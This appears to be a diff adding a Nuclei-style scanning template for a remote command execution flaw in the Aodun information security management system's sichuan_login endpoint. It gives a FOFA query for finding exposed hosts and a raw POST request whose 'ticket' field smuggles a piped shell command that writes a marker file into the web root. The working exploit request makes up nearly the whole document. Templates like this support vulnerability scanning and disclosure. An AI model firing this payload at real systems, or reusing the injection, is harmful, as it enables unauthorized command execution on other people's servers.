@@ -1,0 +1,57 @@
+id: poc-ca088t8p63ryinax
+info:
+  name: 傲盾信息安全管理系统前台 sichuan_login 远程命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ca088t8p63ryinax'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ca088t8p63ryinax
+    fofa: body="傲盾软件" && body="aodun/aodun.js"
+http:
+- raw:
+  - 'POST /user_management/sichuan_login HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    loginname=sysadmin&ticket=|echo%20 dudesuite>/adm/isms_web/static/base_static/js/aodun/dudesuite.txt
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /static/base_static/js/aodun/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
